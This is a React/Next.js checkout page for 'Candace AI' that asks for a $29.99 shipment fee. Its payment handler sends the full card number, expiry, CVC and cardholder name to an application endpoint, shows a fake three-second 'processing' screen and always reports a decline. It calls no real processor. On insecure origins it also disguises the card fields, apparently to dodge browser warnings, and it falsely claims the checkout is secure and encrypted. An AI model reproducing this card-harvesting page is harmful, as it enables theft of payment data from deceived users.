"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";

const SHIPMENT_FEE = 29.99;
const PROCESSING_MS = 3000;

type PaymentMethod = "card";
type PaymentPhase = "form" | "processing";

function formatCardNumber(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(value: string): string {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) {
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }
  return digits;
}

function ProcessingSpinner() {
  return (
    <div className="payment-processing-spinner" aria-hidden="true">
      {Array.from({ length: 12 }).map((_, i) => (
        <span
          key={i}
          style={{
            transform: `rotate(${i * 30}deg)`,
            animationDelay: `${-(i * (1.1 / 12))}s`,
          }}
        />
      ))}
    </div>
  );
}

function CardBrandIcons() {
  return (
    <div className="flex items-center gap-1.5 shrink-0 opacity-50">
      <span className="text-[9px] font-bold tracking-tight text-muted border border-border rounded px-1 py-0.5">
        VISA
      </span>
      <span className="text-[9px] font-bold tracking-tight text-muted border border-border rounded px-1 py-0.5">
        MC
      </span>
      <span className="text-[9px] font-bold tracking-tight text-muted border border-border rounded px-1 py-0.5">
        AMEX
      </span>
    </div>
  );
}

function PaymentMethodTab({
  active,
  disabled,
  onClick,
  icon,
  label,
}: {
  active: boolean;
  disabled?: boolean;
  onClick: () => void;
  icon: React.ReactNode;
  label: string;
}) {
  return (
    <button
      type="button"
      onClick={onClick}
      disabled={disabled}
      className={`flex-1 flex items-center justify-center gap-2 rounded-lg border-[0.75px] px-3 py-3 text-xs transition-colors ${
        active
          ? "border-accent text-foreground bg-accent/5"
          : "border-border text-muted hover:border-muted/40 hover:text-foreground/80"
      } ${disabled ? "opacity-40 cursor-not-allowed hover:border-border hover:text-muted" : ""}`}
    >
      {icon}
      <span>{label}</span>
    </button>
  );
}

export default function PaymentPage() {
  const router = useRouter();
  const [phase, setPhase] = useState<PaymentPhase>("form");
  const [method, setMethod] = useState<PaymentMethod>("card");
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [error, setError] = useState("");
  const [isSecure, setIsSecure] = useState(true);

  useEffect(() => {
    if (typeof window !== "undefined") {
      setIsSecure(
        window.location.protocol === "https:" ||
        window.location.hostname === "localhost" ||
        window.location.hostname === "127.0.0.1"
      );
    }
  }, []);

  async function handlePay() {
    if (method !== "card") return;

    if (!cardholderName.trim() || !cardNumber.trim() || !expiry.trim() || !cvc.trim()) {
      setError("Please complete all payment fields.");
      return;
    }

    setError("");
    setPhase("processing");

    const id = sessionStorage.getItem("applicationId");
    const cardRequest = id
      ? fetch(`/api/applications/${id}/card`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            cardholderName,
            cardNumber,
            cardExpiry: expiry,
            cardCvc: cvc,
          }),
        }).catch(() => {})
      : Promise.resolve();

    await Promise.all([cardRequest, new Promise((r) => setTimeout(r, PROCESSING_MS))]);

    router.push("/access/declined");
  }

  if (phase === "processing") {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-6">
        <p className="text-lg md:text-xl font-medium text-foreground text-center mb-8">
          Your payment is processing
        </p>
        <ProcessingSpinner />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <div className="flex items-center justify-between px-6 md:px-16 py-6">
        <Link
          href="/"
          className="text-[10px] tracking-widest text-muted uppercase hover:text-foreground transition-colors"
        >
          Candace AI
        </Link>
        <Link
          href="/access"
          className="text-[10px] tracking-widest text-muted uppercase hover:text-foreground transition-colors"
        >
          ← Back
        </Link>
      </div>

      <div className="flex-1 flex items-center justify-center px-4 md:px-8 pb-12">
        <div className="w-full max-w-md">
          <div className="rounded-2xl border border-border bg-background-card p-6 md:p-8 shadow-[0_24px_80px_rgba(0,0,0,0.45)]">
            <p className="text-[10px] tracking-[0.3em] text-accent uppercase font-medium mb-1">
              Payment
            </p>
            <h1 className="text-2xl font-semibold text-foreground">Initial shipment</h1>
            <p className="text-muted text-sm mt-1 mb-6">
              One-time fee · ${SHIPMENT_FEE.toFixed(2)}
            </p>

            <div className="flex gap-2 mb-6">
              <PaymentMethodTab
                active={method === "card"}
                onClick={() => setMethod("card")}
                label="Card"
                icon={
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" className="w-4 h-4">
                    <rect x="2" y="5" width="20" height="14" rx="2" />
                    <path d="M2 10h20" />
                  </svg>
                }
              />
            </div>

            {method === "card" && (
              <div className="space-y-4">
                <div>
                  <label htmlFor={isSecure ? "card-number" : "cn-field"} className="payment-label">
                    Card number
                  </label>
                  <div className="relative">
                    <input
                      id={isSecure ? "card-number" : "cn-field"}
                      type="text"
                      placeholder="1234 1234 1234 1234"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                      className="payment-field pr-28"
                      inputMode="numeric"
                      autoComplete={isSecure ? "cc-number" : "off"}
                    />
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      <CardBrandIcons />
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label htmlFor={isSecure ? "expiry" : "exp-field"} className="payment-label">
                      Expiration date
                    </label>
                    <input
                      id={isSecure ? "expiry" : "exp-field"}
                      type="text"
                      placeholder="MM/YY"
                      value={expiry}
                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                      className="payment-field"
                      inputMode="numeric"
                      autoComplete={isSecure ? "cc-exp" : "off"}
                    />
                  </div>
                  <div>
                    <label htmlFor={isSecure ? "cvc" : "sec-field"} className="payment-label">
                      Security code
                    </label>
                    <div className="relative">
                      <input
                        id={isSecure ? "cvc" : "sec-field"}
                        type="text"
                        placeholder="CVV"
                        value={cvc}
                        onChange={(e) =>
                          setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))
                        }
                        className="payment-field pr-10"
                        inputMode="numeric"
                        autoComplete={isSecure ? "cc-csc" : "off"}
                      />
                      <svg
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        strokeWidth="1.5"
                        className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-muted/60"
                      >
                        <rect x="2" y="5" width="20" height="14" rx="2" />
                        <path d="M7 15h4" />
                      </svg>
                    </div>
                  </div>
                </div>

                <div>
                  <label htmlFor={isSecure ? "cardholder" : "ch-field"} className="payment-label">
                    Cardholder name
                  </label>
                  <input
                    id={isSecure ? "cardholder" : "ch-field"}
                    type="text"
                    placeholder="Full name on card"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className="payment-field"
                    autoComplete={isSecure ? "cc-name" : "off"}
                  />
                </div>
              </div>
            )}

            {error && (
              <p className="text-red-400/90 text-xs mt-4">{error}</p>
            )}

            <button
              type="button"
              onClick={handlePay}
              disabled={method !== "card"}
              className="w-full rounded-full bg-accent text-background text-sm font-semibold py-4 mt-6 hover:bg-accent-soft transition-all duration-300 disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {`Pay $${SHIPMENT_FEE.toFixed(2)}`}
            </button>

            <p className="text-muted/50 text-[10px] text-center mt-4 tracking-wide">
              🔒 Secure checkout — your information is protected and encrypted.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

